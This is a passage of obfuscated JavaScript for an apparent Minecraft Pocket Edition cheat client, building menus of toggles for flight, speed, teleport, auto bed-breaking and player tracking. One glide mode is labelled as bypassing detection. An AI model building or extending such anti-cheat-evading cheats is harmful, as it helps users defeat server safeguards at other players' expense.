                                        if (!mineplexflyed) {
                                            mineplexflys = true;
                                            mineplexflyed = true
                                            fctoast('随枫吖:和Mineplex飞行一样(这是高级版的飞行哦)')
                                        } else {
                                            mineplexflys = false;
                                            mineplexflyed = false
                                        };
                                        mineplexfly['setChecked'](mineplexflyed)
                                    }
                                }));
                                _0x2bf6x147['addView'](mineplexfly);

                                var glides = new Switch(ctx);
                                glides['setText']('滑行[缓慢下降]');
                                glides['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                glides['setPadding'](10, 3, 3, 3);
                                glides['setTextSize'](15);
                                glides['setBackground'](module);
                                glides['getBackground']()['setAlpha'](120);
                                glides['setChecked'](glideed);
                                glides['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!glideed) {
                                            glidess = true;
                                            glideed = true;
                                        } else {
                                            glidess = false;
                                            glideed = false
                                        };
                                        glides['setChecked'](glideed)
                                    }
                                }));
                                _0x2bf6x147['addView'](glides);
                                var ndglides = new Switch(ctx);
                                ndglides['setText']('滑行[永不向下]');
                                ndglides['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                ndglides['setPadding'](10, 3, 3, 3);
                                ndglides['setTextSize'](15);
                                ndglides['setBackground'](module);
                                ndglides['getBackground']()['setAlpha'](120);
                                ndglides['setChecked'](ndglideed);
                                ndglides['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!ndglideed) {
                                            ndglidess = true;
                                            ndglideed = true
                                        } else {
                                            ndglidess = false;
                                            ndglideed = false
                                        };
                                        ndglides['setChecked'](ndglideed)
                                    }
                                }));
                                _0x2bf6x147['addView'](ndglides);
                                var bypassglides = new Switch(ctx);
                                bypassglides['setText']('滑行[绕过检测]');
                                bypassglides['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                bypassglides['setPadding'](10, 3, 3, 3);
                                bypassglides['setTextSize'](15);
                                bypassglides['setBackground'](module);
                                bypassglides['getBackground']()['setAlpha'](120);
                                bypassglides['setChecked'](bypassglideed);
                                bypassglides['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!bypassglideed) {
                                            bypassglidess = true;
                                            bypassglideed = true
                                        } else {
                                            bypassglidess = false;
                                            bypassglideed = false
                                        };
                                        bypassglides['setChecked'](bypassglideed)
                                    }
                                }));
                                _0x2bf6x147['addView'](bypassglides);
                                var sglides = new Switch(ctx);
                                sglides['setText']('滑行[加速下降]');
                                sglides['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                sglides['setPadding'](10, 3, 3, 3);
                                sglides['setTextSize'](15);
                                sglides['setBackground'](module);
                                sglides['getBackground']()['setAlpha'](120);
                                sglides['setChecked'](sglideed);
                                sglides['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!sglideed) {
                                            sglidess = true;
                                            sglideed = true
                                        } else {
                                            sglidess = false;
                                            sglideed = false
                                        };
                                        sglides['setChecked'](sglideed)
                                    }
                                }));
                                _0x2bf6x147['addView'](sglides);
                                var dmgglides = new Switch(ctx);
                                dmgglides['setText']('滑行[缓慢下降]');
                                dmgglides['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                dmgglides['setPadding'](10, 3, 3, 3);
                                dmgglides['setTextSize'](15);
                                dmgglides['setBackground'](module);
                                dmgglides['getBackground']()['setAlpha'](120);
                                dmgglides['setChecked'](dmgglideed);
                                dmgglides['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!dmgglideed) {
                                            dmgglidess = true;
                                            dmgglideed = true
                                        } else {
                                            dmgglidess = false;
                                            dmgglideed = false
                                        };
                                        dmgglides['setChecked'](dmgglideed)
                                    }
                                }));
                                _0x2bf6x147['addView'](dmgglides);
                                var upglides = new Switch(ctx);
                                upglides['setText']('滑行[缓慢上升]');
                                upglides['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                upglides['setPadding'](10, 3, 3, 3);
                                upglides['setTextSize'](15);
                                upglides['setBackground'](module);
                                upglides['getBackground']()['setAlpha'](120);
                                upglides['setChecked'](upglideed);
                                upglides['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!upglideed) {
                                            upglidess = true;
                                            upglideed = true
                                        } else {
                                            upglidess = false;
                                            upglideed = false
                                        };
                                        upglides['setChecked'](upglideed)
                                    }
                                }));
                                _0x2bf6x147['addView'](upglides);
                                var airjumps = new Switch(ctx);
                                airjumps['setText']('空中跳跃');
                                airjumps['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                airjumps['setPadding'](10, 3, 3, 3);
                                airjumps['setTextSize'](15);
                                airjumps['setBackground'](module);
                                airjumps['getBackground']()['setAlpha'](120);
                                airjumps['setChecked'](airjumped);
                                airjumps['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!airjumped) {
                                            showJumpBtn();
                                            airjumped = true;
                                            fctoast('点击右下角的"枫"字即可')
                                        } else {
                                            GUIj['dismiss']();
                                            airjumped = false
                                        };
                                        airjumps['setChecked'](airjumped)
                                    }
                                }));
                                _0x2bf6x147['addView'](airjumps);
                                var highjumps = new Switch(ctx);
                                highjumps['setText']('高跳');
                                highjumps['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                highjumps['setPadding'](10, 3, 3, 3);
                                highjumps['setTextSize'](15);
                                highjumps['setBackground'](module);
                                highjumps['getBackground']()['setAlpha'](120);
                                highjumps['setChecked'](highjumped);
                                highjumps['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!highjumped) {
                                            highjumpss = true;
                                            highjumped = true
                                        } else {
                                            highjumpss = false;
                                            highjumped = false
                                        };
                                        highjumps['setChecked'](highjumped)
                                    }
                                }));
                                _0x2bf6x147['addView'](highjumps);
                                var hitjumps = new Switch(ctx);
                                hitjumps['setText']('攻击跳跃');
                                hitjumps['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                hitjumps['setPadding'](10, 3, 3, 3);
                                hitjumps['setTextSize'](15);
                                hitjumps['setBackground'](module);
                                hitjumps['getBackground']()['setAlpha'](120);
                                hitjumps['setChecked'](hitjumped);
                                hitjumps['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!hitjumped) {
                                            hitjumpss = true;
                                            hitjumped = true
                                        } else {
                                            hitjumpss = false;
                                            hitjumped = false
                                        };
                                        hitjumps['setChecked'](hitjumped)
                                    }
                                }));
                                _0x2bf6x147['addView'](hitjumps);
                                var tapjumps = new Switch(ctx);
                                tapjumps['setText']('点击跳跃');
                                tapjumps['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                tapjumps['setPadding'](10, 3, 3, 3);
                                tapjumps['setTextSize'](15);
                                tapjumps['setBackground'](module);
                                tapjumps['getBackground']()['setAlpha'](120);
                                tapjumps['setChecked'](tapjumped);
                                tapjumps['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!tapjumped) {
                                            tapjumpss = true;
                                            tapjumped = true
                                        } else {
                                            tapjumpss = false;
                                            tapjumped = false
                                        };
                                        tapjumps['setChecked'](tapjumped)
                                    }
                                }));
                                _0x2bf6x147['addView'](tapjumps);
                                var longhops = new Switch(ctx);
                                longhops['setText']('兔子跳');
                                longhops['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                longhops['setPadding'](10, 3, 3, 3);
                                longhops['setTextSize'](15);
                                longhops['setBackground'](module);
                                longhops['getBackground']()['setAlpha'](120);
                                longhops['setChecked'](longhoped);
                                longhops['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!longhoped) {
                                            longhopss = true;
                                            longhoped = true
                                        } else {
                                            longhopss = false;
                                            longhoped = false;
                                            lhtick = 0
                                        };
                                        longhops['setChecked'](longhoped)
                                    }
                                }));
                                _0x2bf6x147['addView'](longhops);
                                var speeds = new Switch(ctx);
                                speeds['setText']('变速齿轮');
                                speeds['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                speeds['setPadding'](10, 3, 3, 3);
                                speeds['setTextSize'](15);
                                speeds['setBackground'](module);
                                speeds['getBackground']()['setAlpha'](120);
                                speeds['setChecked'](speeded);
                                speeds['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!speeded) {
                                            speedss = true;
                                            speeded = true
                                        } else {
                                            speedss = false;
                                            speeded = false
                                        };
                                        speeds['setChecked'](speeded)
                                    }
                                }));
                                _0x2bf6x147['addView'](speeds);
                                var zoomspeeds = new Switch(ctx);
                                zoomspeeds['setText']('疾跑速度');
                                zoomspeeds['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                zoomspeeds['setPadding'](10, 3, 3, 3);
                                zoomspeeds['setTextSize'](15);
                                zoomspeeds['setBackground'](module);
                                zoomspeeds['getBackground']()['setAlpha'](120);
                                zoomspeeds['setChecked'](zoomspeeded);
                                zoomspeeds['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!zoomspeeded) {
                                            zoomspeedss = true;
                                            zoomspeeded = true
                                        } else {
                                            zoomspeedss = false;
                                            zoomspeeded = false
                                        };
                                        zoomspeeds['setChecked'](zoomspeeded)
                                    }
                                }));
                                _0x2bf6x147['addView'](zoomspeeds);
                                var jumpspeeds = new Switch(ctx);
                                jumpspeeds['setText']('持续跳[加速]');
                                jumpspeeds['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                jumpspeeds['setPadding'](10, 3, 3, 3);
                                jumpspeeds['setTextSize'](15);
                                jumpspeeds['setBackground'](module);
                                jumpspeeds['getBackground']()['setAlpha'](120);
                                jumpspeeds['setChecked'](jumpspeeded);
                                jumpspeeds['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!jumpspeeded) {
                                            jumpspeedss = true;
                                            jumpspeeded = true
                                        } else {
                                            jumpspeedss = false;
                                            jumpspeeded = false
                                        };
                                        jumpspeeds['setChecked'](jumpspeeded)
                                    }
                                }));
                                _0x2bf6x147['addView'](jumpspeeds);
                                var cspeeds = new Switch(ctx);
                                cspeeds['setText']('潜行速度');
                                cspeeds['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                cspeeds['setPadding'](10, 3, 3, 3);
                                cspeeds['setTextSize'](15);
                                cspeeds['setBackground'](module);
                                cspeeds['getBackground']()['setAlpha'](120);
                                cspeeds['setChecked'](cspeeded);
                                cspeeds['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!cspeeded) {
                                            cspeedss = true;
                                            cspeeded = true
                                        } else {
                                            cspeedss = false;
                                            cspeeded = false
                                        };
                                        cspeeds['setChecked'](cspeeded)
                                    }
                                }));
                                _0x2bf6x147['addView'](cspeeds);
                                var lbsgspeeds = new Switch(ctx);
                                lbsgspeeds['setText']('LB速度');
                                lbsgspeeds['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                lbsgspeeds['setPadding'](10, 3, 3, 3);
                                lbsgspeeds['setTextSize'](15);
                                lbsgspeeds['setBackground'](module);
                                lbsgspeeds['getBackground']()['setAlpha'](120);
                                lbsgspeeds['setChecked'](lbsgspeeded);
                                lbsgspeeds['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!lbsgspeeded) {
                                            lbsgspeedss = true;
                                            lbsgspeeded = true
                                        } else {
                                            lbsgspeedss = false;
                                            lbsgspeeded = false;
                                            ModPE['setGameSpeed'](20)
                                        };
                                        lbsgspeeds['setChecked'](lbsgspeeded)
                                    }
                                }));
                                _0x2bf6x147['addView'](lbsgspeeds);
                                var follows = new Switch(ctx);
                                follows['setText']('跟随玩家');
                                follows['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                follows['setPadding'](10, 3, 3, 3);
                                follows['setTextSize'](15);
                                follows['setBackground'](module);
                                follows['getBackground']()['setAlpha'](120);
                                follows['setChecked'](followed);
                                follows['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!followed) {
                                            followss = true;
                                            followed = true
                                        } else {
                                            followss = false;
                                            followed = false
                                        };
                                        follows['setChecked'](followed)
                                    }
                                }));
                                _0x2bf6x147['addView'](follows);
                                var autowalks = new Switch(ctx);
                                autowalks['setText']('自动行走');
                                autowalks['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                autowalks['setPadding'](10, 3, 3, 3);
                                autowalks['setTextSize'](15);
                                autowalks['setBackground'](module);
                                autowalks['getBackground']()['setAlpha'](120);
                                autowalks['setChecked'](autowalked);
                                autowalks['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!autowalked) {
                                            autowalkss = true;
                                            autowalked = true
                                        } else {
                                            autowalkss = false;
                                            autowalked = false
                                        };
                                        autowalks['setChecked'](autowalked)
                                    }
                                }));
                                _0x2bf6x147['addView'](autowalks);
                                var jetpacks = new Switch(ctx);
                                jetpacks['setText']('喷气背包');
                                jetpacks['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                jetpacks['setPadding'](10, 3, 3, 3);
                                jetpacks['setTextSize'](15);
                                jetpacks['setBackground'](module);
                                jetpacks['getBackground']()['setAlpha'](120);
                                jetpacks['setChecked'](jetpacked);
                                jetpacks['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!jetpacked) {
                                            jetpackss = true;
                                            jetpacked = true
                                            fctoast('随枫吖:你的指针指向哪就飞向哪')
                                        } else {
                                            jetpackss = false;
                                            jetpacked = false
                                        };
                                        jetpacks['setChecked'](jetpacked)
                                    }
                                }));
                                _0x2bf6x147['addView'](jetpacks);
                                var steps = new Switch(ctx);
                                steps['setText']('爬墙[瞬移]');
                                steps['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                steps['setPadding'](10, 3, 3, 3);
                                steps['setTextSize'](15);
                                steps['setBackground'](module);
                                steps['getBackground']()['setAlpha'](120);
                                steps['setChecked'](steped);
                                steps['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!steped) {
                                            stepss = true;
                                            steped = true
                                        } else {
                                            stepss = false;
                                            steped = false
                                        };
                                        steps['setChecked'](steped)
                                    }
                                }));
                                _0x2bf6x147['addView'](steps);
                                var csteps = new Switch(ctx);
                                csteps['setText']('爬墙[平滑]');
                                csteps['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                csteps['setPadding'](10, 3, 3, 3);
                                csteps['setTextSize'](15);
                                csteps['setBackground'](module);
                                csteps['getBackground']()['setAlpha'](120);
                                csteps['setChecked'](csteped);
                                csteps['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!csteped) {
                                            cstepss = true;
                                            csteped = true
                                        } else {
                                            cstepss = false;
                                            csteped = false
                                        };
                                        csteps['setChecked'](csteped)
                                    }
                                }));
                                _0x2bf6x147['addView'](csteps);
                                menu2 = new PopupWindow(_0x2bf6x149, ctx['getWindowManager']()['getDefaultDisplay']()['getWidth']() / 4, ctx['getWindowManager']()['getDefaultDisplay']()['getHeight']());
                                menu2['setAnimationStyle'](android['R']['style'].Animation_InputMethod);
                                menu2['showAtLocation'](ctx['getWindow']()['getDecorView'](), 1, 0, 0)
                            } catch (error) {
                                Toast['makeText'](ctx, 'Flqme Error: ' + error, 1)['show']()
                            }
                        }
                    }))
                }
                var _0x2bf6x152 = new TextView(ctx);
                _0x2bf6x152['setText']('玩家');
                _0x2bf6x152['setTextColor'](Color['rgb'](255, 0, 255));
                _0x2bf6x152['setTextSize'](24);
                _0x2bf6x152['setBackground'](theme);
                _0x2bf6x152['getBackground']()['setAlpha'](100);
                _0x2bf6x152['setGravity'](Gravity.CENTER);
                _0x2bf6x152['setOnClickListener'](new View.OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        _0x2bf6x153();
                        exitplayer();
                        if (menu != null && menu['isShowing']()) {
                            menu['dismiss']()
                        };
                        if (GUI != null && GUI['isShowing']()) {
                            GUI['dismiss']()
                        };
                        exitUI['dismiss']()
                    }
                }));
                _0x2bf6x147['addView'](_0x2bf6x152);

                function _0x2bf6x153() {
                    ctx['runOnUiThread'](new Runnable({
                        run: function() {
                            try {
                                var _0x2bf6x147 = new LinearLayout(ctx);
                                var _0x2bf6x148 = new ScrollView(ctx);
                                var _0x2bf6x149 = new LinearLayout(ctx);
                                _0x2bf6x147['setOrientation'](1);
                                _0x2bf6x147['setBackground'](theme);
                                _0x2bf6x147['getBackground']()['setAlpha'](120);
                                _0x2bf6x149['setOrientation'](1);
                                _0x2bf6x148['addView'](_0x2bf6x147);
                                _0x2bf6x149['addView'](_0x2bf6x148);
                                var _0x2bf6x154 = new TextView(ctx);
                                _0x2bf6x154['setTextSize'](20);
                                _0x2bf6x154['setText']('-| 玩家 |-');
                                _0x2bf6x154['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                _0x2bf6x154['setBackgroundDrawable'](new ColorDrawable(Color.BLACK));
                                _0x2bf6x154['getBackground']()['setAlpha'](150);
                                _0x2bf6x154['setGravity'](Gravity.CENTER);
                                _0x2bf6x147['addView'](_0x2bf6x154);
                                var _0x2bf6x155 = new Button(ctx);
                                _0x2bf6x155['setText']('游戏模式');
                                _0x2bf6x155['setTextColor'](Color['rgb'](255, 0, 255));
                                _0x2bf6x155['setTextSize'](18);
                                _0x2bf6x155['setBackground'](gmbg);
                                _0x2bf6x155['getBackground']()['setAlpha'](120);
                                _0x2bf6x155['setGravity'](Gravity.CENTER);
                                _0x2bf6x155['setOnClickListener'](new View.OnClickListener({
                                    onClick: function(_0x2bf6x132) {
                                        if (gmChange == 1) {
                                            gmChange = 0
                                        } else {
                                            gmChange = 1
                                        };
                                        Level['setGameMode'](gmChange)
                                    }
                                }));
                                _0x2bf6x147['addView'](_0x2bf6x155);
                                var nearwarnings = new Switch(ctx);
                                nearwarnings['setText']('玩家信息');
                                nearwarnings['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                nearwarnings['setPadding'](10, 3, 3, 3);
                                nearwarnings['setTextSize'](15);
                                nearwarnings['setBackground'](module);
                                nearwarnings['getBackground']()['setAlpha'](120);
                                nearwarnings['setChecked'](nearwarninged);
                                nearwarnings['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!nearwarninged) {
                                            nearwarningss = true;
                                            nearwarninged = true
                                            fctoast('随枫吖:显示附近的玩家相关坐标等')
                                        } else {
                                            nearwarningss = false;
                                            nearwarninged = false
                                        };
                                        nearwarnings['setChecked'](nearwarninged)
                                    }
                                }));
                                _0x2bf6x147['addView'](nearwarnings);
                                var forcedestroys = new Switch(ctx);
                                forcedestroys['setText']('强制破坏');
                                forcedestroys['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                forcedestroys['setPadding'](10, 3, 3, 3);
                                forcedestroys['setTextSize'](15);
                                forcedestroys['setBackground'](module);
                                forcedestroys['getBackground']()['setAlpha'](120);
                                forcedestroys['setChecked'](forcedestroyed);
                                forcedestroys['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!forcedestroyed) {
                                            forcedestroyss = true;
                                            forcedestroyed = true
                                            fctoast('破坏后虽然方块还在，但你看不到，并且可以穿过去')
                                        } else {
                                            forcedestroyss = false;
                                            forcedestroyed = false
                                        };
                                        forcedestroys['setChecked'](forcedestroyed)
                                    }
                                }));
                                _0x2bf6x147['addView'](forcedestroys);
                                var bedbreakers = new Switch(ctx);
                                bedbreakers['setText']('自动挖床');
                                bedbreakers['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                bedbreakers['setPadding'](10, 3, 3, 3);
                                bedbreakers['setTextSize'](15);
                                bedbreakers['setBackground'](module);
                                bedbreakers['getBackground']()['setAlpha'](120);
                                bedbreakers['setChecked'](bedbreakered);
                                bedbreakers['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!bedbreakered) {
                                            bedbreakerss = true;
                                            bedbreakered = true;
                                            fctoast('瞄准床即可自动破坏(多人游戏可能会闪退)')
                                        } else {
                                            bedbreakerss = false;
                                            bedbreakered = false
                                        };
                                        bedbreakers['setChecked'](bedbreakered)
                                    }
                                }));
                                _0x2bf6x147['addView'](bedbreakers);
                                var fastbreaks = new Switch(ctx);
                                fastbreaks['setText']('加速破坏');
                                fastbreaks['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                fastbreaks['setPadding'](10, 3, 3, 3);
                                fastbreaks['setTextSize'](15);
                                fastbreaks['setBackground'](module);
                                fastbreaks['getBackground']()['setAlpha'](120);
                                fastbreaks['setChecked'](fastbreaked);
                                fastbreaks['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!fastbreaked) {
                                            fastbreakss = true;
                                            fastbreaked = true
                                        } else {
                                            fastbreakss = false;
                                            fastbreaked = false;
                                            for (i = 0; i < 256; i++) {
                                                Block['setDestroyTime'](i, defDestroyTime[i])
                                            }
                                        };
                                        fastbreaks['setChecked'](fastbreaked)
                                    }
                                }));
                                _0x2bf6x147['addView'](fastbreaks);
                                var fullbrights = new Switch(ctx);
                                fullbrights['setText']('充足亮度');
                                fullbrights['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                fullbrights['setPadding'](10, 3, 3, 3);
                                fullbrights['setTextSize'](15);
                                fullbrights['setBackground'](module);
                                fullbrights['getBackground']()['setAlpha'](120);
                                fullbrights['setChecked'](fullbrighted);
                                fullbrights['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!fullbrighted) {
                                            fullbrightss = true;
                                            fullbrighted = true;
                                            fctoast('当你破坏一个区块的方块时(区块更新)会自动把方块变为白天时的亮度')
                                        } else {
                                            fullbrightss = false;
                                            fullbrighted = false;
                                            Block['setLightLevel'](0, 0)
                                        };
                                        fullbrights['setChecked'](fullbrighted)
                                    }
                                }));
                                _0x2bf6x147['addView'](fullbrights);
                                var taptps = new Switch(ctx);
                                taptps['setText']('点击传送');
                                taptps['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                taptps['setPadding'](10, 3, 3, 3);
                                taptps['setTextSize'](15);
                                taptps['setBackground'](module);
                                taptps['getBackground']()['setAlpha'](120);
                                taptps['setChecked'](taptped);
                                taptps['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!taptped) {
                                            taptpss = true;
                                            taptped = true
                                        } else {
                                            taptpss = false;
                                            taptped = false
                                        };
                                        taptps['setChecked'](taptped)
                                    }
                                }));
                                _0x2bf6x147['addView'](taptps);
                                var placetps = new Switch(ctx);
                                placetps['setText']('自动搭路');
                                placetps['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                placetps['setPadding'](10, 3, 3, 3);
                                placetps['setTextSize'](15);
                                placetps['setBackground'](module);
                                placetps['getBackground']()['setAlpha'](120);
                                placetps['setChecked'](placetped);
                                placetps['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!placetped) {
                                            placetpss = true;
                                            placetped = true
                                            fctoast('随枫吖:点一下 移动一格')
                                        } else {
                                            placetpss = false;
                                            placetped = false
                                        };
                                        placetps['setChecked'](placetped)
                                    }
                                }));
                                _0x2bf6x147['addView'](placetps);
                                var elevators = new Switch(ctx);
                                elevators['setText']('上下瞬移');
                                elevators['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                elevators['setPadding'](10, 3, 3, 3);
                                elevators['setTextSize'](15);
                                elevators['setBackground'](module);
                                elevators['getBackground']()['setAlpha'](120);
                                elevators['setChecked'](elevatored);
                                elevators['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!elevatored) {
                                            showElevatorBtn();
                                            elevatored = true
                                        } else {
                                            GUIe['dismiss']();
                                            elevatored = false
                                        };
                                        elevators['setChecked'](elevatored)
                                    }
                                }));
                                _0x2bf6x147['addView'](elevators);
                                var ctrlzooms = new Switch(ctx);
                                ctrlzooms['setText']('放大画面');
                                ctrlzooms['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                ctrlzooms['setPadding'](10, 3, 3, 3);
                                ctrlzooms['setTextSize'](15);
                                ctrlzooms['setBackground'](module);
                                ctrlzooms['getBackground']()['setAlpha'](120);
                                ctrlzooms['setChecked'](ctrlzoomed);
                                ctrlzooms['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!ctrlzoomed) {
                                            showZoomSwitch();
                                            ctrlzoomed = true
                                        } else {
                                            GUIz['dismiss']();
                                            ctrlzoomed = false
                                        };
                                        ctrlzooms['setChecked'](ctrlzoomed)
                                    }
                                }));
                                _0x2bf6x147['addView'](ctrlzooms);
                                var viewchangers = new Switch(ctx);
                                viewchangers['setText']('切换视角');
                                viewchangers['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                viewchangers['setPadding'](10, 3, 3, 3);
                                viewchangers['setTextSize'](15);
                                viewchangers['setBackground'](module);
                                viewchangers['getBackground']()['setAlpha'](120);
                                viewchangers['setChecked'](viewchangered);
                                viewchangers['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!viewchangered) {
                                            showF5Btn();
                                            viewchangered = true
                                            fctoast('可能会闪退')
                                        } else {
                                            GUIv['dismiss']();
                                            viewchangered = false
                                        };
                                        viewchangers['setChecked'](viewchangered)
                                    }
                                }));
                                _0x2bf6x147['addView'](viewchangers);
                                var fallbacks = new Switch(ctx);
                                fallbacks['setText']('虚空回弹');
                                fallbacks['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                fallbacks['setPadding'](10, 3, 3, 3);
                                fallbacks['setTextSize'](15);
                                fallbacks['setBackground'](module);
                                fallbacks['getBackground']()['setAlpha'](120);
                                fallbacks['setChecked'](fallbacked);
                                fallbacks['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!fallbacked) {
                                            fallbackss = true;
                                            fallbacked = true
                                            fctoast('随枫吖:当你掉入虚空时会自动回来')
                                        } else {
                                            fallbackss = false;
                                            fallbacked = false
                                        };
                                        fallbacks['setChecked'](fallbacked)
                                    }
                                }));
                                _0x2bf6x147['addView'](fallbacks);
                                var fastfalls = new Switch(ctx);
                                fastfalls['setText']('快速坠落');
                                fastfalls['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                fastfalls['setPadding'](10, 3, 3, 3);
                                fastfalls['setTextSize'](15);
                                fastfalls['setBackground'](module);
                                fastfalls['getBackground']()['setAlpha'](120);
                                fastfalls['setChecked'](fastfalled);
                                fastfalls['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!fastfalled) {
                                            fastfallss = true;
                                            fastfalled = true
                                            fctoast('随枫吖:走到物体边缘时自动传送到下面且无伤害')
                                        } else {
                                            fastfallss = false;
                                            fastfalled = false
                                        };
                                        fastfalls['setChecked'](fastfalled)
                                    }
                                }));
                                _0x2bf6x147['addView'](fastfalls);
                                var regenerations = new Switch(ctx);
                                regenerations['setText']('快速回血');
                                regenerations['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                regenerations['setPadding'](10, 3, 3, 3);
                                regenerations['setTextSize'](15);
                                regenerations['setBackground'](module);
                                regenerations['getBackground']()['setAlpha'](120);
                                regenerations['setChecked'](regenerationed);
                                regenerations['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!regenerationed) {
                                            regenerationss = true;
                                            regenerationed = true;
                                            fctoast('吃东西不要动回血')
                                        } else {
                                            regenerationss = false;
                                            regenerationed = false
                                        };
                                        regenerations['setChecked'](regenerationed)
                                    }
                                }));
                                _0x2bf6x147['addView'](regenerations);
                                var sregens = new Switch(ctx);
                                sregens['setText']('冻结画面');
                                sregens['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                sregens['setPadding'](10, 3, 3, 3);
                                sregens['setTextSize'](15);
                                sregens['setBackground'](module);
                                sregens['getBackground']()['setAlpha'](120);
                                sregens['setChecked'](sregend);
